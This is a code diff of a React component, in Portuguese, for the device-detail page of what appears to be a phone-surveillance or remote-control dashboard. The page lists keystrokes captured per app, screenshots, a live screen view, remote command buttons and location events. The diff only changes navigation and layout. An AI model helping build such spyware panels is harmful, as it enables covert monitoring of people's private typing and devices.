@@ -1,4 +1,5 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
+import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
@@ -8,15 +9,18 @@ import { trpc } from "@/lib/trpc";
 
 interface DeviceDetailsProps {
   deviceId: string;
-  deviceName: string;
-  onBack: () => void;
+  user?: { email: string; name: string };
+  onLogout?: () => void;
 }
 
 export default function DeviceDetails({
   deviceId,
-  deviceName,
-  onBack,
+  user,
+  onLogout,
 }: DeviceDetailsProps) {
+  const [, setLocation] = useLocation();
+  const deviceName = `Smartphone ${deviceId}`;
+  
   const [activeTab, setActiveTab] = useState("info");
   const [isLiveActive, setIsLiveActive] = useState(true);
   const [isControlActive, setIsControlActive] = useState(false);
@@ -81,7 +85,7 @@ export default function DeviceDetails({
   const handleRemoveDevice = () => {
     if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
       alert(`❌ Dispositivo ${deviceName} removido com sucesso`);
-      onBack();
+      setLocation("/dispositivos");
     }
   };
 
@@ -107,7 +111,7 @@ export default function DeviceDetails({
 
   const handleRemoveAllKeylogs = () => {
     if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
-      keylogs.forEach((keylog) => {
+      keylogs.forEach((keylog: any) => {
         deleteKeylogMutation.mutate({ keylogId: keylog.id });
       });
     }
@@ -132,7 +136,7 @@ export default function DeviceDetails({
       {/* Header */}
       <div className="flex items-center justify-between">
         <Button
-          onClick={onBack}
+          onClick={() => setLocation("/dispositivos")}
           variant="outline"
           className="text-cyan-400 border-cyan-600 hover:bg-cyan-900"
         >
@@ -297,10 +301,10 @@ export default function DeviceDetails({
                     <h4 className="text-cyan-400 font-bold">{cmd.title}</h4>
                     <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                   </div>
+                  <Button size="sm" className="bg-cyan-600 hover:bg-cyan-700">
+                    Executar
+                  </Button>
                 </div>
-                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">
-                  Executar
-                </Button>
               </Card>
             ))}
           </div>
@@ -308,114 +312,134 @@ export default function DeviceDetails({
 
         {/* Aba: Screenshots */}
         <TabsContent value="screenshots" className="space-y-4">
-          <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados (6)</h3>
-            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
-              {[1, 2, 3, 4, 5, 6].map((i) => (
-                <div key={i} className="bg-slate-700 rounded-lg aspect-video flex items-center justify-center border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
-                  <p className="text-slate-400">📱 Screenshot {i}</p>
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            {[1, 2, 3, 4].map((i) => (
+              <Card key={i} className="bg-slate-800 border-slate-700 p-4">
+                <div className="bg-slate-900 rounded-lg aspect-video mb-3 flex items-center justify-center">
+                  <div className="text-center">
+                    <p className="text-4xl mb-2">📱</p>
+                    <p className="text-slate-400 text-sm">Screenshot {i}</p>
+                    <p className="text-slate-500 text-xs mt-1">2 horas atrás</p>
+                  </div>
                 </div>
-              ))}
-            </div>
-          </Card>
+                <Button size="sm" variant="outline" className="w-full text-cyan-400 border-cyan-600">
+                  Visualizar
+                </Button>
+              </Card>
+            ))}
+          </div>
         </TabsContent>
 
         {/* Aba: Keylogs */}
         <TabsContent value="keylogs" className="space-y-4">
-          <Card className="bg-slate-800 border-slate-700 p-6">
-            <div className="flex justify-between items-center mb-4">
-              <h3 className="text-cyan-400 font-bold">⌨️ Keylogs Capturados ({keylogs.length})</h3>
-              <div className="flex gap-2">
-                <Button
-                  onClick={handleRemoveSelectedKeylogs}
-                  disabled={selectedKeylogs.size === 0}
-                  className="bg-red-600 hover:bg-red-700 text-white disabled:opacity-50"
-                >
-                  🗑️ Remover Selecionados ({selectedKeylogs.size})
-                </Button>
-                <Button
-                  onClick={handleRemoveAllKeylogs}
-                  className="bg-red-700 hover:bg-red-800 text-white"
-                >
-                  ⚠️ Remover Todos
-                </Button>
-              </div>
-            </div>
+          <div className="flex gap-2 mb-4">
+            <Button
+              size="sm"
+              className="bg-red-600 hover:bg-red-700"
+              onClick={handleRemoveSelectedKeylogs}
+              disabled={selectedKeylogs.size === 0}
+            >
+              🗑️ Remover Selecionados ({selectedKeylogs.size})
+            </Button>
+            <Button
+              size="sm"
+              variant="outline"
+              className="text-red-400 border-red-600"
+              onClick={handleRemoveAllKeylogs}
+            >
+              ⚠️ Remover Todos
+            </Button>
+          </div>
 
-            {keylogsLoading ? (
-              <p className="text-slate-400 text-center py-8">Carregando keylogs...</p>
-            ) : keylogs.length === 0 ? (
-              <p className="text-slate-400 text-center py-8">Nenhum keylog capturado</p>
-            ) : (
-              <div className="space-y-2 max-h-96 overflow-y-auto">
-                {keylogs.map((log) => (
-                  <div
-                    key={log.id}
-                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
-                  >
+          {keylogsLoading ? (
+            <div className="text-center py-8">
+              <p className="text-slate-400">Carregando keylogs...</p>
+            </div>
+          ) : keylogs.length === 0 ? (
+            <div className="text-center py-8">
+              <p className="text-slate-400">Nenhum keylog registrado</p>
+            </div>
+          ) : (
+            <div className="space-y-2">
+              {keylogs.map((log: any) => (
+                <Card key={log.id} className="bg-slate-800 border-slate-700 p-4">
+                  <div className="flex items-start gap-3">
                     <input
                       type="checkbox"
                       checked={selectedKeylogs.has(log.id)}
                       onChange={() => handleToggleKeylogSelection(log.id)}
-                      className="w-4 h-4 cursor-pointer"
+                      className="mt-1"
                     />
                     <div className="flex-1">
-                      <p className="text-slate-300">
-                        <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
-                      </p>
-                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
+                      <p className="text-cyan-300 font-semibold">{log.app}</p>
+                      <p className="text-slate-300 text-sm break-words">{log.text}</p>
+                      <p className="text-slate-500 text-xs mt-1">{formatTime(log.timestamp)}</p>
                     </div>
                   </div>
+                </Card>
+              ))}
+            </div>
+          )}
+
+          {deletedKeylogs.length > 0 && (
+            <div className="mt-8">
+              <h4 className="text-cyan-400 font-bold mb-3">🗑️ Keylogs Deletados</h4>
+              <div className="space-y-2">
+                {deletedKeylogs.map((log: any) => (
+                  <Card key={log.id} className="bg-slate-800 border-slate-700 p-4 opacity-50">
+                    <div className="flex items-start justify-between">
+                      <div>
+                        <p className="text-slate-400 font-semibold">{log.app}</p>
+                        <p className="text-slate-400 text-sm break-words">{log.text}</p>
+                        <p className="text-slate-500 text-xs mt-1">{formatTime(log.timestamp)}</p>
+                      </div>
+                      <Button
+                        size="sm"
+                        variant="outline"
+                        className="text-green-400 border-green-600"
+                        onClick={() => handleRestoreKeylog(log.id)}
+                      >
+                        ↩️ Restaurar
+                      </Button>
+                    </div>
+                  </Card>
                 ))}
               </div>
-            )}
-          </Card>
+            </div>
+          )}
         </TabsContent>
 
         {/* Aba: Histórico */}
         <TabsContent value="history" className="space-y-4">
-          <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">📜 Histórico de Keylogs Removidos ({deletedKeylogs.length})</h3>
-            {deletedKeylogs.length === 0 ? (
-              <p className="text-slate-400 text-center py-8">Nenhum keylog no histórico</p>
-            ) : (
-              <div className="space-y-2 max-h-96 overflow-y-auto">
-                {deletedKeylogs.map((log) => (
-                  <div
-                    key={log.id}
-                    className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600 hover:border-yellow-500 transition"
-                  >
-                    <div>
-                      <p className="text-slate-300">
-                        <span className="text-yellow-400">{log.appName}</span>: {log.keyText}
-                      </p>
-                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
-                    </div>
-                    <Button
-                      onClick={() => handleRestoreKeylog(log.id)}
-                      className="bg-green-600 hover:bg-green-700 text-white text-sm"
-                    >
-                      ↩️ Restaurar
-                    </Button>
+          <div className="space-y-3">
+            {[
+              { icon: "✅", title: "Conectado", time: "Agora" },
+              { icon: "📸", title: "Screenshot capturado", time: "5 min atrás" },
+              { icon: "🔒", title: "Tela bloqueada", time: "15 min atrás" },
+              { icon: "🔄", title: "Sincronizado", time: "1 hora atrás" },
+              { icon: "📍", title: "Localização atualizada", time: "2 horas atrás" },
+            ].map((event, idx) => (
+              <Card key={idx} className="bg-slate-800 border-slate-700 p-4">
+                <div className="flex items-center gap-3">
+                  <p className="text-2xl">{event.icon}</p>
+                  <div>
+                    <p className="text-cyan-300 font-semibold">{event.title}</p>
+                    <p className="text-slate-400 text-sm">{event.time}</p>
                   </div>
-                ))}
-              </div>
-            )}
-          </Card>
+                </div>
+              </Card>
+            ))}
+          </div>
         </TabsContent>
       </Tabs>
 
-      {/* Visualização ao Vivo */}
+      {/* Phone Frame Preview */}
       {isLiveActive && (
         <div className="mt-8">
-          <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">
-              🔴 Visualização Ao Vivo
-            </h3>
-            <div className="flex justify-center py-8">
-              <PhoneFrame status="Transmissão ao vivo do dispositivo" />
-            </div>
-          </Card>
+          <h3 className="text-cyan-400 font-bold mb-4">📱 Visualização ao Vivo</h3>
+          <div className="flex justify-center">
+            <PhoneFrame />
+          </div>
         </div>
       )}
     </div>
